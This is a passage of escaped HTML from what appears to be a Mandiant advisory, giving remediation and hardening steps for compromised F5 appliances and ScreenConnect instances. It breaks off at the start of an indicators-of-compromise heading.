Hardening\u003c/h2\u003e\n\u003cp\u003eMandiant recommends performing the following remediation and hardening actions on impacted F5 appliances:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRestrict access to the F5 TMUI from the internet.\u003c/li\u003e\n\u003cli\u003eImmediately apply the F5 mitigation script published in [\u003ca href\u003d\"https://my.f5.com/manage/s/article/K000137353\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cu\u003eK000137353\u003c/u\u003e\u003c/a\u003e] to any vulnerable F5 appliances.\u003c/li\u003e\n\u003cli\u003eInvestigate vulnerable F5 appliances for evidence of compromise.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eIn the event of F5 compromise:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eReview appliance configurations for unauthorized modifications.\u003c/li\u003e\n\u003cli\u003eReview file system and operating system (OS) artifacts for evidence of privileged account creation and remove any unauthorized accounts.\u003c/li\u003e\n\u003cli\u003eConsider revoking and re-issuing sensitive cryptographic material such as certificates and private keys that may have been accessible to a threat actor.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eFor impacted ScreenConnect instances, Mandiant recommends that organizations with an on-premises controller \u003ca href\u003d\"https://services.google.com/fh/files/misc/connectwise-screenconnect-remediation-hardening-guide.pdf\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cu\u003eread our latest ScreenConnect remediation and hardening guide\u003c/u\u003e\u003c/a\u003e.\u003c/p\u003e\n\u003ch2\u003eIndicators of Compromise (IOCs)\u003c/h2\u003e\n\u003ch3\u003eNetwork IOCs\u003c/h3\u003e"]]],[null,null,[null,[null,"\u003cdiv align\u003d\"left\"\u003e\n\u003cdiv
